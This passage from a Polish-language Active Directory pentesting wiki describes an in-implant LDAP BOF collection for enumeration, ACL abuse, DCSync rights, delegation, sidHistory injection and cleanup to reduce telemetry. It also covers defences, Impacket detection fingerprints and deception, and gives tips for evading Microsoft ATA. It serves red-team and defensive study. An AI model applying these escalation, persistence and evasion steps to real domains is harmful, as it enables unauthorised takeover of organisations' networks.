[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponownie implementuje prymitywy LDAP w stylu bloodyAD jako x64 Beacon Object Files, które działają w całości wewnątrz implantu działającego na hoście (np. Adaptix C2). Operatorzy kompilują pakiet za pomocą `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z poziomu beacona. Cały ruch wykorzystuje bieżący kontekst bezpieczeństwa logowania przez LDAP (389) z signing/sealing lub LDAPS (636) z automatycznym zaufaniem certyfikatom, więc nie są wymagane proxy socks ani artefakty na dysku.<sup>[[4]](#references)</sup>

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające im obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym deskryptory bezpieczeństwa), a także metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` bezpośrednio z LDAP udostępniają kandydatów do roasting, ustawienia delegacji oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` i `get-writable --detailed` analizują DACL, aby wyświetlić zaufane podmioty, prawa (GenericAll/WriteDACL/WriteOwner/zapisy atrybutów) oraz dziedziczenie, zapewniając natychmiastowe cele do eskalacji uprawnień za pomocą ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Prymitywy zapisu LDAP na potrzeby eskalacji i persistence

- BOF-y tworzenia obiektów (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe principals lub konta komputerów w dowolnym miejscu, w którym istnieją uprawnienia OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` umożliwiają bezpośrednie przejęcie celów po znalezieniu praw zapisu właściwości.
- Polecenia skupione na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, przekształcają WriteDACL/WriteOwner dowolnego obiektu AD w resetowanie haseł, kontrolę członkostwa w grupach lub uprawnienia replikacji DCSync, bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegation, roasting i nadużywanie Kerberos

- `add-spn`/`set-spn` natychmiast sprawiają, że przejęty użytkownik może zostać poddany Kerberoastingowi; `add-asreproastable` (przełącznik UAC) oznacza go jako podatnego na AS-REP roasting bez modyfikowania hasła.
- Makra delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) przepisują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z poziomu beaconu, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę używania zdalnego PowerShell lub RSAT.

### Wstrzykiwanie sidHistory, przenoszenie OU i kształtowanie attack surface

- `add-sidhistory` wstrzykuje uprzywilejowane SID-y do historii SID kontrolowanego principal (zobacz [SID-History Injection](sid-history-injection.md)), zapewniając dyskretne dziedziczenie dostępu w całości przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenieść zasoby do OU, w których już istnieją delegowane uprawnienia, a następnie nadużyć `set-password`, `add-groupmember` lub `add-spn`.
- Ściśle ukierunkowane polecenia usuwania (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` itd.) umożliwiają szybki rollback po zebraniu przez operatora poświadczeń lub uzyskaniu persistence, minimalizując telemetry.

## AD -> Azure i Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Kilka ogólnych zabezpieczeń

[**Dowiedz się więcej o ochronie poświadczeń tutaj.**](../stealing-credentials/credentials-protections.md)

### **Środki ochrony poświadczeń**

- **Ograniczenia dla Domain Admins**: Zaleca się, aby Domain Admins mogli logować się wyłącznie do Domain Controllers, co pozwala uniknąć ich używania na innych hostach.
- **Uprawnienia kont usług**: Usługi nie powinny być uruchamiane z uprawnieniami Domain Admin (DA), aby zachować bezpieczeństwo.
- **Czasowe ograniczanie uprawnień**: W przypadku zadań wymagających uprawnień DA ich czas trwania powinien być ograniczony. Można to osiągnąć za pomocą: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Ograniczanie LDAP relay**: Audytuj identyfikatory zdarzeń 2889/3074/3075, a następnie wymuś LDAP signing oraz LDAPS channel binding na DC/klientach, aby blokować próby LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting aktywności Impacket na poziomie protokołu

Jeśli chcesz wykrywać typowe działania AD, **nie polegaj wyłącznie na artefaktach kontrolowanych przez operatora**, takich jak zmienione nazwy plików binarnych, nazwy usług, tymczasowe pliki batch lub ścieżki wyjściowe. Ustal bazowy profil tego, jak legalne klienty Windows tworzą ruch [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC i WMI, a następnie szukaj **cech implementacyjnych**, które pozostają nawet po zmodyfikowaniu przez operatora plików `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` lub `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Samodzielne wskaźniki o wysokiej pewności** (po zweryfikowaniu względem własnego profilu bazowego):
- Uwierzytelnione DCE/RPC z użyciem `auth_context_id = 79231 + ctx_id`
- Wypełnienie paddingu uwierzytelniania DCE/RPC wartością `0xff`
- Kerberos binds LDAP, które umieszczają surowy `AP-REQ` Kerberos bezpośrednio w `mechToken` SPNEGO
- Żądania negotiate SMB2/3 z wartościami `ClientGuid` wyglądającymi jak ASCII
- WMI `IWbemLevel1Login::NTLMLogin` używające niestandardowej przestrzeni nazw `//./root/cimv2`
- Zahardkodowane wartości nonce Kerberos
- **Lepsze jako cechy korelacji/scoringu**:
- Rzadkie lub zduplikowane listy etype Kerberos, nietypowe/brakujące `PA-DATA` lub kolejność etype w TGS-REQ różniąca się od natywnego Windows
- Wiadomości NTLM Type 1 bez informacji o wersji lub wiadomości Type 3 z pustymi nazwami hostów
- Surowy NTLMSSP przenoszony w DCE/RPC zamiast SPNEGO, brak trailerów weryfikacyjnych DCE/RPC lub niezgodności OID SPNEGO/Kerberos
- Kilka takich cech pochodzących z tego samego hosta/użytkownika/sesji/przedziału czasowego jest znacznie silniejszym wskaźnikiem niż dowolne pojedyncze, słabe pole
- **Używaj jako wzbogacenia, nie jako samodzielnych alertów**:
- Domyślne nazwy plików, ścieżki wyjściowe, losowe nazwy usług, tymczasowe nazwy plików batch, domyślne nazwy kont komputerów oraz charakterystyczne dla narzędzi ciągi HTTP/WebDAV/RDP/MSSQL
- Operatorzy mogą je łatwo zmienić, dlatego najlepiej wykorzystywać je do wyjaśnienia, dlaczego klaster międzyprotokołowy jest podejrzany
- **Uwagi operacyjne**:
- Niektóre z tych sygnałów wymagają odszyfrowanego ruchu, [analizy PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW lub widoczności po stronie usług
- Przed przekształceniem ich w alerty zweryfikuj je względem klientów Samba/Linux, urządzeń i starszego oprogramowania
- W miarę wzrostu pewności co do profilu bazowego przenoś detekcje z enrichment -> hunting -> alerting

### **Implementowanie technik deception**

- Implementowanie deception polega na zastawianiu pułapek, takich jak decoy users lub computers, z cechami takimi jak hasła, które nie wygasają, lub oznaczenie Trusted for Delegation. Szczegółowe podejście obejmuje tworzenie użytkowników z określonymi uprawnieniami lub dodawanie ich do grup o wysokich uprawnieniach.<sup>[[2]](#references)</sup>
- Praktyczny przykład obejmuje użycie narzędzi takich jak: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Więcej informacji o wdrażaniu technik deception można znaleźć na stronie [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identyfikowanie deception**

- **Dla obiektów użytkowników**: Podejrzane wskaźniki obejmują nietypowy ObjectSID, rzadkie logowania, daty utworzenia oraz małą liczbę nieudanych prób podania hasła.
- **Wskaźniki ogólne**: Porównanie atrybutów potencjalnych decoy objects z atrybutami prawdziwych obiektów może ujawnić niespójności. Narzędzia takie jak [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) mogą pomóc w identyfikowaniu takich deception.

### **Omijanie systemów detekcji**

- **Omijanie detekcji Microsoft ATA**:
- **User Enumeration**: Unikanie enumeracji sesji na Domain Controllers, aby zapobiec detekcji przez ATA.
- **Ticket Impersonation**: Używanie kluczy **aes** do tworzenia ticketów pomaga uniknąć detekcji, ponieważ nie następuje downgrade do NTLM.
- **Ataki DCSync**: Zaleca się wykonywanie ich z systemu innego niż Domain Controller, aby uniknąć detekcji ATA, ponieważ bezpośrednie wykonanie z Domain Controller wywoła alerty.

## References

- [1] [Przewodnik po atakowaniu zaufania domen](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Fałszowanie zaufania na potrzeby deception w Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Od Domain Admin do Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Kolekcja LDAP BOF – narzędzie LDAP działające w pamięci do eksploatacji Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Wykorzystanie hashy NTLM jako wordlisty](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – analiza Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: przejmowanie kont Active Directory przez Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Jak zarządzać zmianami w bezpiecznych połączeniach kanału Netlogon związanymi z CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Podróż przez zapomniane interfejsy Null Session i MS-RPC](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Czy filtr SID jest granicą bezpieczeństwa między domenami? (Część 4) – badanie omijania filtrowania SID](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Czy filtr SID jest granicą bezpieczeństwa między domenami? (Część 5) – atak na zaufanie Golden GMSA – od domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Czy filtr SID jest granicą bezpieczeństwa między domenami? (Część 6) – atak na zaufanie przez zmianę schematu – od domeny podrzędnej do nadrzędnej](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Od DA do EA z ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Eskalacja od administratorów domeny podrzędnej do administratorów przedsiębiorstwa w 5 minut dzięki nadużyciu AD CS – ciąg dalszy](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE w rękawie: projektowanie backdoorów DACL w Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Kod źródłowy modułu pre2k NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - atrybut msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
